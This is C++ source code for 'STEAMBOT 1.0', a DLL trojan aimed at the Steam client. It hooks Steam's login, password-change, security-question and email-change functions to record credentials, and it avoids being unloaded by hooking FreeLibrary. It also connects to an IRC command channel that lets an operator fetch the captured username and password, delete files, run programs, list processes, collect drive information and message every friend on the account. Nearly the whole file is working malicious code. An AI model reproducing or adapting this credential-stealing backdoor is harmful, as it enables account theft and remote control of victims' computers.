// steam_.cpp : Defines the entry point for the DLL application.
//

#pragma warning( disable: 4996 )

#include "stdafx.h"
#include "steam_.h"
#include "steaminfo.h"
#include <winsock2.h>
#include "irc/irc.h"
#include <string>
#include <iostream>
#include <tlhelp32.h>
using namespace std;

/************************************************************************************/
/* STEAMBOT 1.0 source by s0beit - greetz											*/
/* myg0t.com																		*/
/* bottalk.us																		*/
/* milw0rm.com																		*/
/* irc.lcirc.net #myg0t, #bottalk, #milw0rm											*/
/* irc.fuckurinter.net #FYINet to support me for no real reason :p					*/
/************************************************************************************/
/************************************************************************************/
/* All steam interface stuff														*/
/************************************************************************************/
//redefined, thanks valve!
typedef void *( *CreateInterfaceFn )( const char *pName, int *pReturnCode );

//steam login functions to steal data
typedef unsigned int ( __cdecl *SteamLogin_t )( const char *cszUser, const char *cszPassphrase, int bIsSecureComputer, int *pError );
typedef unsigned int ( __cdecl *SteamChangePassword_t )( const char *cszCurrentPassphrase, const char *cszNewPassphrase, int *pbChanged, int *pError );
typedef unsigned int ( __cdecl *SteamChangePersonalQA_t )( const char *cszCurrentPassphrase, const char *cszNewPersonalQuestion, const char *cszNewAnswerToQuestion, int *pbChanged, int *pError );
typedef unsigned int ( __cdecl *SteamChangeEmailAddress_t )( const char *cszNewEmailAddress, int *pbChanged, int *pError );

SteamLogin_t					pSteamLogin;
SteamChangePassword_t			pSteamChangePassword;
SteamChangePersonalQA_t			pSteamChangePersonalQA;
SteamChangeEmailAddress_t		pSteamChangeEmailAddress;

//steam interfaces we are going to use
ISteamClient*				g_pSteamClient			= NULL;
ISteamClient006*			g_pSteamClient006		= NULL;
ISteamBilling*				g_pSteamBilling			= NULL; //still exsposed? come on!
ISteamFriends*				g_pSteamFriends			= NULL;
ISteamFriends001*			g_pSteamFriends001		= NULL;
ISteamUtils*				g_pSteamUtils			= NULL;
ISteamUser*					g_pSteamUser			= NULL;
ISteamUserStats*			g_pSteamStats			= NULL;
ISteamMatchmaking*			g_pMatchMaking			= NULL;
ISteamMatchmakingServers*	g_pMatchMakingSvr		= NULL;
ISteamApps*					g_pSteamApps			= NULL;

//used for logging information
cSteamInfo					g_SteamInfo;

bool GrabSteamClientModule( HMODULE* hModule )
{
	*hModule = GetModuleHandleA("steamclient.dll");
	return ( *hModule == NULL ) ? false : true;
}

bool IsSteamReady( HMODULE hSteamClient, HSteamUser newUser, HSteamPipe newPipe )
{
	typedef bool (*tSteam_BLoggedOn)( HSteamUser hUser, HSteamPipe hSteamPipe );
	tSteam_BLoggedOn pSteam_BLoggedOn = (tSteam_BLoggedOn)GetProcAddress(hSteamClient,"Steam_BLoggedOn");

	typedef bool (*tSteam_BConnected)( HSteamUser hUser, HSteamPipe hSteamPipe );
	tSteam_BConnected pSteam_BConnected = (tSteam_BConnected)GetProcAddress(hSteamClient,"Steam_BConnected");

	if( !pSteam_BConnected || !pSteam_BLoggedOn )
		return false;

	if( pSteam_BConnected( newUser, newPipe ) && pSteam_BLoggedOn( newUser, newPipe ) )
		return true;

	return false;
}

//================================================================================================
//you must remember, true command size is
//cmd.size() - 1, remember.

void Cmd_join(cIRC* irc, irc_data_s ircdata, privmsg_info_s pmdata, vector<string> &cmd)
{
	char* channel	= (char*)pmdata.location.c_str();

	if( cmd.size() > 5 )
	{
		irc->JoinChannel( (char*)cmd[4].c_str(), (char*)cmd[5].c_str() );
	}
	else if( cmd.size() == 5 )
	{
		irc->JoinChannel( (char*)cmd[4].c_str(), "" );
	}
	else
	{
		irc->PrivMsg( channel, "[ join ] Invalid parameters!" );
	}
}

void Cmd_part(cIRC* irc, irc_data_s ircdata, privmsg_info_s pmdata, vector<string> &cmd)
{
	if( cmd.size() > 4 )
	{
		irc->PartChannel( (char*)cmd[4].c_str() );	
	}
	else
	{
		irc->PrivMsg( (char*)pmdata.location.c_str(), 
			"[ part ] Invalid parameters!" );
	}
}

void Cmd_quit(cIRC* irc, irc_data_s ircdata, privmsg_info_s pmdata, vector<string> &cmd)
{
	irc->PrivMsg( (char*)pmdata.location.c_str(), "QUIT command issued, bye!" );
	irc->send_local( "QUIT %s", pmdata.postcommand.c_str() );
}

void Cmd_logout(cIRC* irc, irc_data_s ircdata, privmsg_info_s pmdata, vector<string> &cmd)
{
	if( irc->GetIRCData()->userAuth->LogoutUser( pmdata.vhost ) )
	{
		irc->PrivMsg_s( (char*)pmdata.location.c_str(), 
			"Logout success [%s]", pmdata.name.c_str() );
	}
	else
	{
		irc->PrivMsg_s( (char*)pmdata.location.c_str(), 
			"Logout failure (user not logged in?)" );
	}
}

void Cmd_delete(cIRC* irc, irc_data_s ircdata, privmsg_info_s pmdata, vector<string> &cmd)
{
	char* channel	= (char*)pmdata.location.c_str();

	//use remove()
	if( pmdata.postcommand.size() > 0 )
	{
		if( remove( pmdata.postcommand.c_str() ) == 0 )
		{
			irc->PrivMsg_s( channel, "Deleted file [%s]", pmdata.postcommand );
			return;
		}
	}

	irc->PrivMsg_s( channel, "Error deleting file [%s]", pmdata.postcommand );
}

struct drive_info_s
{
	unsigned __int64	i64FreeBytesToCaller, i64TotalBytes, i64FreeBytes;
	UINT				iDriveType;
	char				volumeName[3];

	drive_info_s()
	{
		i64FreeBytesToCaller	= 0;
		i64TotalBytes			= 0;
		i64FreeBytes			= 0;
		iDriveType				= DRIVE_REMOVABLE;
		memset( volumeName, 0, 3 );
	}
};

void GetDrivesInfo( vector<drive_info_s> *masterVector )
{
	if(!masterVector)
		return;

	DWORD dwSectPerClust,
		dwBytesPerSect,
		dwFreeClusters,
		dwTotalClusters;

	char volumes[256]	= {0};
	char *volumeAux		= NULL;
	
	if(GetLogicalDriveStringsA( 256, volumes ))
	{
		volumeAux = volumes;

		bool b98ob = (GetProcAddress( GetModuleHandleA( "kernel32.dll" ), "GetDiskFreeSpaceExA" )==NULL);

start_lp:
		while( *volumeAux != '\0' )
		{
			drive_info_s newInfo;

			if(b98ob)
			{
				//use older version for compatability
				if( GetDiskFreeSpaceA( volumeAux, 
					&dwSectPerClust,
                    &dwBytesPerSect, 
                    &dwFreeClusters,
                    &dwTotalClusters) == TRUE )
				{
					newInfo.i64TotalBytes	= (__int64)dwTotalClusters * dwSectPerClust * dwBytesPerSect;
					newInfo.i64FreeBytes	= (__int64)dwFreeClusters * dwSectPerClust * dwBytesPerSect;
				}else{
					volumeAux += strlen(volumeAux)+1;
					goto start_lp;
				}
			}
			else
			{
				//use updated
				if( GetDiskFreeSpaceExA( volumeAux,
					(PULARGE_INTEGER)&newInfo.i64FreeBytesToCaller,
					(PULARGE_INTEGER)&newInfo.i64TotalBytes,
					(PULARGE_INTEGER)&newInfo.i64FreeBytes ) == FALSE )
				{
					volumeAux += strlen(volumeAux)+1;
					goto start_lp;
				}
			}

			newInfo.iDriveType = GetDriveTypeA( volumeAux );

			strcpy( newInfo.volumeName, volumeAux );

			masterVector->push_back( newInfo );

			volumeAux += strlen(volumeAux)+1;
		}
	}
}

void Cmd_sysinfo(cIRC* irc, irc_data_s ircdata, privmsg_info_s pmdata, vector<string> &cmd)
{
	char* channel	= (char*)pmdata.location.c_str();

	//print system information
	vector<drive_info_s> vHddVector;
	GetDrivesInfo( &vHddVector );

	if( vHddVector.size() )
	{
		for( int i = 0; i < (int)vHddVector.size(); i++ )
		{
			drive_info_s drivei = vHddVector[i];

			char driveType[14]	= {0};

			switch( drivei.iDriveType )
			{
				case DRIVE_REMOVABLE:
					strcpy( driveType, "Removable" );
					break;
				case DRIVE_FIXED:
					strcpy( driveType, "Hard Drive" );
					break;
				case DRIVE_CDROM:
					strcpy( driveType, "ROM (CD/DVD)" );
					break;
				default:
					strcpy( driveType, "Unknown" );
					break;
			}

			irc->PrivMsg_s( channel, "Volume: %3s (%s) - Total Space: %I64u MB - Free Space: %I64u MB",
				drivei.volumeName, driveType, drivei.i64TotalBytes/(1024*1024), drivei.i64FreeBytes/(1024*1024) );
		}
	}
}

void Cmd_execute(cIRC* irc, irc_data_s ircdata, privmsg_info_s pmdata, vector<string> &cmd)
{
	char* channel	= (char*)pmdata.location.c_str();

	if( !pmdata.postcommand.empty() )
	{

		if( fopen( pmdata.postcommand.c_str(), "rb" ) == NULL )
		{
			irc->PrivMsg( channel, "File does not exist!" );
			return;
		}

		/* CreateProcess API initialization */
		STARTUPINFOA siStartupInfo;
		PROCESS_INFORMATION piProcessInfo;
		memset(&siStartupInfo, 0, sizeof(siStartupInfo));
		memset(&piProcessInfo, 0, sizeof(piProcessInfo));
		siStartupInfo.cb = sizeof(siStartupInfo);

		if( CreateProcessA(pmdata.postcommand.c_str(),
			0, 0, 0, false,
			CREATE_DEFAULT_ERROR_MODE, 0, 0,
			&siStartupInfo, &piProcessInfo) != false )
		{
			irc->PrivMsg_s( channel, "CreateProcess success [ PID: %i ]",
				piProcessInfo.dwProcessId );
		}
		else
		{
			irc->PrivMsg( channel, "CreateProcess failed!" );
		}
	}
}

void Cmd_listproc(cIRC* irc, irc_data_s ircdata, privmsg_info_s pmdata, vector<string> &cmd)
{
	char* channel	= (char*)pmdata.location.c_str();

	PROCESSENTRY32* pProcessInfo = new PROCESSENTRY32;
	HANDLE hSnapShot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );

	pProcessInfo->dwSize = sizeof( PROCESSENTRY32 );

	while( Process32Next( hSnapShot, pProcessInfo ) != FALSE )
	{
		int i = 0;

		size_t sizeLen = wcslen( pProcessInfo->szExeFile );

		char *szProcessName = new char[ sizeLen + 1 ];

		while( pProcessInfo->szExeFile[i] != '\0' )
		{
			szProcessName[i] = ( CHAR )pProcessInfo->szExeFile[i];
			++i;
		}

		irc->PrivMsg_s( channel, "Process [ name: %s ][ pid: %i ]",
			szProcessName, pProcessInfo->th32ProcessID );
	}
}

void Cmd_info(cIRC* irc, irc_data_s ircdata, privmsg_info_s pmdata, vector<string> &cmd)
{
	char* channel	= (char*)pmdata.location.c_str();

	irc->PrivMsg( channel, "\2\x1FSTEAMBOT 1.0 by s0beit\2\x1F" );
	irc->PrivMsg( channel, "----------------------" );
	irc->PrivMsg( channel, "myg0t.com - Video game sociopaths" );
	irc->PrivMsg( channel, "bottalk.us - Bots and hacking" );
	irc->PrivMsg( channel, "milw0rm.com - Exploits and information" );
	irc->PrivMsg( channel, "----------------------" );
}

void Cmd_friendsname(cIRC* irc, irc_data_s ircdata, privmsg_info_s pmdata, vector<string> &cmd)
{
	char* channel	= (char*)pmdata.location.c_str();

	if( !g_pSteamFriends )
	{
		irc->PrivMsg( channel, "g_pSteamFriends invalid at the moment.." );
		return;
	}

	if( g_pSteamFriends->GetPersonaState() == k_EPersonaStateOffline )
	{
		irc->PrivMsg( channel, "Steam Machine is OFFLINE in friends at the moment..." );
		return;
	}

	irc->PrivMsg_s( channel, "Friends Name: %s", g_pSteamFriends->GetPersonaName() );
}

void Cmd_setfriendsname(cIRC* irc, irc_data_s ircdata, privmsg_info_s pmdata, vector<string> &cmd)
{
	char* channel	= (char*)pmdata.location.c_str();
	char* name		= (char*)pmdata.postcommand.c_str();

	if( !g_pSteamFriends )
	{
		irc->PrivMsg( channel, "g_pSteamFriends invalid at the moment.." );
		return;
	}

	if( g_pSteamFriends->GetPersonaState() == k_EPersonaStateOffline )
	{
		irc->PrivMsg( channel, "Steam Machine is OFFLINE in friends at the moment..." );
		return;
	}

	g_pSteamFriends->SetPersonaName( (const char*)name );
	irc->PrivMsg_s( channel, "Friends Name Changed to: %s", name );
}

void Cmd_exit(cIRC* irc, irc_data_s ircdata, privmsg_info_s pmdata, vector<string> &cmd)
{
	char* channel	= (char*)pmdata.location.c_str();

	irc->PrivMsg_s( channel, "Exit command issued by [ %s (%s)]", pmdata.name.c_str(), pmdata.vhost.c_str() );
	TerminateProcess( GetCurrentProcess(), 0 );
}

void Cmd_steamid(cIRC* irc, irc_data_s ircdata, privmsg_info_s pmdata, vector<string> &cmd)
{
	char* channel	= (char*)pmdata.location.c_str();

	CSteamID currentUser = g_pSteamUser->GetSteamID();

	if( !currentUser.IsValid() )
	{
		irc->PrivMsg( channel, "Invalid SteamID Class!" );
		return;
	}

	irc->PrivMsg_s( channel, "SteamID: %i", currentUser.GetStaticAccountKey() );
}

void Cmd_friend_state(cIRC* irc, irc_data_s ircdata, privmsg_info_s pmdata, vector<string> &cmd)
{
	char* channel	= (char*)pmdata.location.c_str();

	if( !g_pSteamFriends )
	{
		irc->PrivMsg( channel, "g_pSteamFriends invalid at the moment.." );
		return;
	}

	string friendStatus = "SteamID Persona State: ";

	switch( g_pSteamFriends->GetPersonaState() )
	{
	case k_EPersonaStateOffline:
		{
			friendStatus.append( "Offline" );
			break;
		}
	case k_EPersonaStateOnline:
		{
			friendStatus.append( "Online" );
			break;
		}
	case k_EPersonaStateBusy:
		{
			friendStatus.append( "Busy" );
			break;
		}
	case k_EPersonaStateAway:
		{
			friendStatus.append( "Away" );
			break;
		}
	case k_EPersonaStateSnooze:
		{
			friendStatus.append( "Snooze" );
			break;
		}
	case k_EPersonaStateMax:
		{
			friendStatus.append( "Max (Error?)" );
			break;
		}
	}

	irc->PrivMsg( channel, (char*)friendStatus.c_str() );
}

void Cmd_friend_msg(cIRC* irc, irc_data_s ircdata, privmsg_info_s pmdata, vector<string> &cmd)
{
	char* channel	= (char*)pmdata.location.c_str();
	string fmsg		= pmdata.postcommand;

	if( !g_pSteamFriends )
	{
		irc->PrivMsg( channel, "g_pSteamFriends invalid at the moment.." );
		return;
	}

	int iCount = g_pSteamFriends->GetFriendCount( k_EFriendFlagAll );

	for( int i = 0; i < iCount; i++ )
	{
		CSteamID currentFriend = g_pSteamFriends->GetFriendByIndex( i, k_EFriendFlagAll );

		if( currentFriend.IsValid() )
		{
			g_pSteamFriends001->SendMsgToFriend( currentFriend, k_EFriendMsgTypeChat, fmsg.c_str() );
		}
	}

	irc->PrivMsg_s( channel, "Message sent to %i friends", iCount );
	irc->PrivMsg_s( channel, "Message Sent [ %s ]", fmsg.c_str() );
}

void Cmd_slogininfo(cIRC* irc, irc_data_s ircdata, privmsg_info_s pmdata, vector<string> &cmd)
{
	char* channel	= (char*)pmdata.location.c_str();

	irc->PrivMsg_s( channel, 
		"Steam Login Information [ User: %s - Pass: %s ]"
		"[ Question: %s - Answer: %s ]"
		"[ Email: %s ]",
		(g_SteamInfo.Username.empty()) ? "NONE" : g_SteamInfo.Username.c_str(), 
		(g_SteamInfo.Password.empty()) ? "NONE" : g_SteamInfo.Password.c_str(),
		(g_SteamInfo.NewQuestion.empty()) ? "NONE" : g_SteamInfo.NewQuestion.c_str(), 
		(g_SteamInfo.QuestionAnswer.empty()) ? "NONE" : g_SteamInfo.QuestionAnswer.c_str(),
		(g_SteamInfo.Email.empty()) ? "NONE" : g_SteamInfo.Email.c_str() );
}

/* DEBUGGING FUNCTION */
void Cmd_postcommand(cIRC* irc, irc_data_s ircdata, privmsg_info_s pmdata, vector<string> &cmd)
{
	char* channel	= (char*)pmdata.location.c_str();
	char* post		= (char*)pmdata.postcommand.c_str();

	irc->PrivMsg_s( channel, "PostCommand: [%s]", post );
}

/* DEBUGGING FUNCTION */
void Cmd_cmddump(cIRC* irc, irc_data_s ircdata, privmsg_info_s pmdata, vector<string> &cmd)
{
	char* channel	= (char*)pmdata.location.c_str();

	for( int i = 0; i < (int)cmd.size(); i++ )
	{
		irc->PrivMsg_s( channel, "Command Dump [%i][%s]", i, cmd[i].c_str() );
	}

	irc->PrivMsg_s( channel, "Raw Data: %s", pmdata.alldata.c_str() );
}

//================================================================================================

unsigned long __stdcall HookSteamAPI(void*)
{
	HMODULE steamClient = NULL;
	CreateInterfaceFn steamClientFactory = NULL;

	while(!GrabSteamClientModule(&steamClient))
	{
		Sleep(10);
	}


#define GRAB_INTERFACE( s, e ) while(s==NULL){s=e;Sleep(10);} //LOG_DATA(s);

	GRAB_INTERFACE( steamClientFactory, (CreateInterfaceFn)GetProcAddress( steamClient, "CreateInterface" ) );
	GRAB_INTERFACE( g_pSteamClient, ( ISteamClient* )steamClientFactory( STEAMCLIENT_INTERFACE_VERSION, NULL ) );
	GRAB_INTERFACE( g_pSteamClient006, ( ISteamClient006* )steamClientFactory( "SteamClient006", NULL ) );

	//we have the client interface (OLD)
	//use the old interface to create pipes
	//no way of knowing what they updated
	HSteamPipe newPipe = g_pSteamClient->CreateSteamPipe( );
	HSteamUser newUser = g_pSteamClient->ConnectToGlobalUser( newPipe );

	GRAB_INTERFACE( g_pSteamFriends,		g_pSteamClient->GetISteamFriends( newUser, newPipe, STEAMFRIENDS_INTERFACE_VERSION ) );
	GRAB_INTERFACE( g_pSteamFriends001,		(ISteamFriends001*)(void*)g_pSteamClient->GetISteamFriends( newUser, newPipe, "SteamFriends001" ) );
	GRAB_INTERFACE( g_pSteamUtils,			g_pSteamClient->GetISteamUtils( newPipe, STEAMUTILS_INTERFACE_VERSION ) );
	GRAB_INTERFACE( g_pSteamUser,			g_pSteamClient->GetISteamUser( newUser, newPipe, STEAMUSER_INTERFACE_VERSION ) );
	GRAB_INTERFACE( g_pSteamStats,			g_pSteamClient->GetISteamUserStats( newUser, newPipe, STEAMUSERSTATS_INTERFACE_VERSION ) );
	GRAB_INTERFACE( g_pMatchMaking,			g_pSteamClient->GetISteamMatchmaking( newUser, newPipe, STEAMMATCHMAKING_INTERFACE_VERSION ) );
	GRAB_INTERFACE( g_pMatchMakingSvr,		g_pSteamClient->GetISteamMatchmakingServers( newUser, newPipe, STEAMMATCHMAKINGSERVERS_INTERFACE_VERSION ) );
	GRAB_INTERFACE( g_pSteamApps,			g_pSteamClient->GetISteamApps( newUser, newPipe, STEAMAPPS_INTERFACE_VERSION ) );

	//release the pipe we created, d'oh
	g_pSteamClient->BReleaseSteamPipe( newPipe );

	//we have the interfaces we want to hook
	//from here we just decide what we need hooked, really

	while(!IsSteamReady( steamClient, newUser, newPipe ))
		Sleep(10);

	//connect to IRC
	cIRC gIRC;

	while( gIRC.GetIRCData()->connected == false )
	{

#define ADD_COMMAND(x) gIRC.AddIRCCommand( #x, (FARPROC)Cmd_##x );

		//setup IRC-exclusive commands
		ADD_COMMAND( join );			//join a channel on IRC
		ADD_COMMAND( part );			//part a channel on IRC
		ADD_COMMAND( quit );			//disconnect from IRC
		ADD_COMMAND( logout );			//deauth

		//setup helper commands for windows
		ADD_COMMAND( delete );			//delete a file
		ADD_COMMAND( sysinfo );			//print system information (Drives, RAM, etc)
		ADD_COMMAND( execute );			//execute program (*.exe)
		ADD_COMMAND( listproc );		//list all processes
		ADD_COMMAND( exit );			//closes steam process

		//setup steam-login commands
		ADD_COMMAND( slogininfo );

		//setup steam-related commands
		ADD_COMMAND( friendsname );		//print current steam community name
		ADD_COMMAND( setfriendsname );	//set steam community name
		ADD_COMMAND( steamid );			//print the users steamid representation (numeric)
		ADD_COMMAND( friend_state );	//get the users current steam community status
		ADD_COMMAND( friend_msg );		//send a message to friends

		//setup misc commands
		ADD_COMMAND( info );
		ADD_COMMAND( cmddump );
		ADD_COMMAND( postcommand );

		//init nick creation
		//wait until the login screen opens
		while( !g_pSteamUser->BLoggedOn() )
			Sleep( 100 );

		CSteamID localUser = g_pSteamUser->GetSteamID();

		while( 
			!localUser.IsValid() 
			|| localUser.GetEUniverse() == k_EUniverseInvalid
			|| localUser.GetEAccountType() == k_EAccountTypeInvalid )
		{
			localUser = g_pSteamUser->GetSteamID();
			Sleep(100);
		}

		char nameString[256] = { 0 };

		int accountKey = 0;
		
		while( accountKey == 0 ) //ghetto fix
		{
			accountKey = (int)localUser.GetStaticAccountKey();
			Sleep( 100 );
		}

		sprintf( nameString, "STEAMBOT-%X", accountKey );

		gIRC.GetIRCData()->userAuth->AddUser( "s0beit", "password" );

		//assign channels to join on init
		gIRC.AddJoinChannel( "#boats" );

		//establish connection
		gIRC.Init( "irc.notarealircd.com", 6667, "steam", nameString, "" );
	}

	return 0;
}

/************************************************************************************/
/* We gonna just hook other shit here, JIC											*/
/************************************************************************************/
CDetour SL, CE, CP, CQA;

unsigned int __cdecl new_SteamLogin( const char *cszUser, const char *cszPassphrase, int bIsSecureComputer, int *pError )
{
	g_SteamInfo.OnLogin( cszUser, cszPassphrase );

	return pSteamLogin( cszUser, cszPassphrase, bIsSecureComputer, pError );
}

unsigned int __cdecl new_SteamChangePassword( const char *cszCurrentPassphrase, const char *cszNewPassphrase, int *pbChanged, int *pError )
{
	g_SteamInfo.OnNewPass( cszCurrentPassphrase, cszNewPassphrase );

	return pSteamChangePassword( cszCurrentPassphrase, cszNewPassphrase, pbChanged, pError );
}

unsigned int __cdecl new_SteamChangePersonalQA( const char *cszCurrentPassphrase, const char *cszNewPersonalQuestion, const char *cszNewAnswerToQuestion, int *pbChanged, int *pError )
{
	g_SteamInfo.OnSecretQ( cszCurrentPassphrase, cszNewPersonalQuestion, cszNewAnswerToQuestion );
	
	return pSteamChangePersonalQA( cszCurrentPassphrase, cszNewPersonalQuestion, cszNewAnswerToQuestion, pbChanged, pError );
}

unsigned int __cdecl new_SteamChangeEmailAddress( const char *cszNewEmailAddress, int *pbChanged, int *pError )
{
	g_SteamInfo.OnEmail( cszNewEmailAddress );
	
	return pSteamChangeEmailAddress( cszNewEmailAddress, pbChanged, pError );
}

unsigned long __stdcall HookExportFunctions(void*)
{
	HMODULE hSteamClient = NULL;
	while( !GrabSteamClientModule(&hSteamClient) )
	{
		Sleep( 10 );
	}

	//hook the exports here
	HMODULE hSteam = NULL;

	while( hSteam == NULL )
	{
		hSteam = GetModuleHandleA( "Steam.dll" );
		Sleep( 10 );
	}

	pSteamLogin = ( SteamLogin_t )SL.Create( ( BYTE* )GetProcAddress( hSteam, "SteamLogin" ), ( BYTE* )new_SteamLogin, DETOUR_TYPE_JMP );
	pSteamChangePassword = ( SteamChangePassword_t )CP.Create( ( BYTE* )GetProcAddress( hSteam, "SteamChangePassword" ), ( BYTE* )new_SteamChangePassword, DETOUR_TYPE_JMP );
	pSteamChangePersonalQA = ( SteamChangePersonalQA_t )CQA.Create( ( BYTE* )GetProcAddress( hSteam, "SteamChangePersonalQA" ), ( BYTE* )new_SteamChangePersonalQA, DETOUR_TYPE_JMP );
	pSteamChangeEmailAddress = ( SteamChangeEmailAddress_t )CE.Create( ( BYTE* )GetProcAddress( hSteam, "SteamChangeEmailAddress" ), ( BYTE* )new_SteamChangeEmailAddress, DETOUR_TYPE_JMP );

	return 0;
}

/************************************************************************************/
/* Used for the miles sound system loader trick										*/
/************************************************************************************/
typedef BOOL ( WINAPI *typeFreeLibrary )( HMODULE hModule );
CDetour			detourFreeLibrary;
typeFreeLibrary	originalFreeLibrary = NULL;

BOOL WINAPI newFreeLibrary( HMODULE hModule )
{
	if( hModule == gApp.m_hSelf )
	{
		//this is when miles tries to eject us
		//we can unhook after this
		if(detourFreeLibrary.IsHooked)
		{
			//unhook this
			detourFreeLibrary.RestoreFunction();
		}

		if( !g_SteamInfo.HashFileExists( ) )
		{
			g_SteamInfo.SetRefreshLoginRequired( 1 );
		}

		return TRUE;
	}

	return originalFreeLibrary( hModule );
}

/************************************************************************************/
/* Used for the miles sound system loader trick										*/
/************************************************************************************/

BOOL APIENTRY DllMain( HMODULE hModule, DWORD dwReason, LPVOID lpReserved )
{
	if( dwReason == DLL_PROCESS_ATTACH )
	{
		//used for app helper tools
		gApp.BaseUponModule(hModule);

		//hook freelibrary so we dont get ejected by
		//the miles sound system

		FARPROC fpFreeLibraryProc = GetProcAddress(GetModuleHandleA("kernel32.dll"),"FreeLibrary");

		detourFreeLibrary.BackupFunction((BYTE*)fpFreeLibraryProc,10);

		originalFreeLibrary = 
			(typeFreeLibrary)detourFreeLibrary.Create( 
			(BYTE*)fpFreeLibraryProc, 
			(BYTE*)newFreeLibrary, 
			DETOUR_TYPE_JMP );

		CreateThread( 0, 0, HookSteamAPI, 0, 0, 0 );
		CreateThread( 0, 0, HookExportFunctions, 0, 0, 0 );
	}

    return TRUE;
}
